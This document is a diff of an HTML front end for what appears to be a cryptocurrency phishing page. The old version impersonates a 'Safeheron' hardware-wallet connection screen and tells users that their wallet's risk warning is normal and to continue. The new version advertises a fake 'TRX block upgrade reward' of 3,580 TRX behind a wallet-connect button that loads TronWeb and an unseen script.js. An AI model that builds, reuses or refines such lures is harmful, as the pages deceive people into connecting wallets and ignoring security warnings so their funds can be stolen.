@@ -1,49 +1,53 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DApp Frontend</title>
+    <title>领取TRX</title>
     <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/@tronprotocol/tronweb@latest/dist/TronWeb.min.js"></script>
+    <script src="script.js" defer></script>
 </head>
 <body>
-    <div class="container">
-        <h1>准备连接Safeheron硬件钱包</h1>
-        <div class="progress-bar">
-            <div id="progress"></div>
+    <div class="background-animation">
+        <div class="top-section">
+            <h2>TRX区块升级奖励</h2>
         </div>
-        <div class="countdown" id="countdown">120秒后请重新连接</div>
-        <h2>Safeheron Wallet</h2>
-        <div class="button-container">
-            <button id="okButton" onclick="connectWallet()">OK</button>
+        <div class="shapes">
+            <!-- 这里是三角形和球体 -->
+            <div class="shape triangle" style="top: 10%; left: 10%;"></div>
+            <div class="shape triangle" style="top: 20%; left: 30%;"></div>
+            <div class="shape triangle" style="top: 30%; left: 50%;"></div>
+            <div class="shape triangle" style="top: 40%; left: 70%;"></div>
+            <div class="shape triangle" style="top: 50%; left: 90%;"></div>
+            <div class="shape triangle" style="top: 60%; left: 80%;"></div>
+            <div class="shape triangle" style="top: 70%; left: 60%;"></div>
+            <div class="shape triangle" style="top: 80%; left: 40%;"></div>
+            <div class="shape triangle" style="top: 90%; left: 20%;"></div>
+            <div class="shape circle" style="top: 15%; left: 15%;"></div>
+            <div class="shape circle" style="top: 25%; left: 35%;"></div>
+            <div class="shape circle" style="top: 35%; left: 55%;"></div>
+            <div class="shape circle" style="top: 45%; left: 75%;"></div>
+            <div class="shape circle" style="top: 55%; left: 85%;"></div>
+            <div class="shape circle" style="top: 65%; left: 65%;"></div>
+            <div class="shape circle" style="top: 75%; left: 45%;"></div>
+            <div class="shape circle" style="top: 85%; left: 25%;"></div>
+            <div class="shape circle" style="top: 95%; left: 5%;"></div>
         </div>
-        <div class="warning">
-连接手机钱包会出现风险提示这是正常的请继续
+        <div class="bottom-section">
+            <div class="rotating-globe"></div>
         </div>
     </div>
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
-    <script>
-        function connectWallet() {
-            console.log("Connecting wallet...");
-        }
-
-        let countdown = 120;
-        const countdownElement = document.getElementById('countdown');
-        const progressElement = document.getElementById('progress');
-
-        function updateCountdown() {
-            countdown--;
-            countdownElement.textContent = `${countdown}秒后请重新连接`;
-            progressElement.style.width = `${(120 - countdown) / 120 * 100}%`;
-
-            if (countdown <= 0) {
-                clearInterval(countdownInterval);
-                countdownElement.textContent = "请重新连接";
-                progressElement.style.width = "100%";
-            }
-        }
-
-        const countdownInterval = setInterval(updateCountdown, 1000);
-    </script>
+    <div class="container">
+        <header class="header">
+            <h1>获取3580枚TRX</h1>
+        </header>
+        <section class="content">
+            <div class="details">
+                <p>升级后向用户投放参与奖励最高可获得3580枚TRX代币奖励</p>
+                <button id="okButton" class="claim-button" onclick="connectWallet()">立即获取</button>
+            </div>
+        </section>
+    </div>
 </body>
 </html>
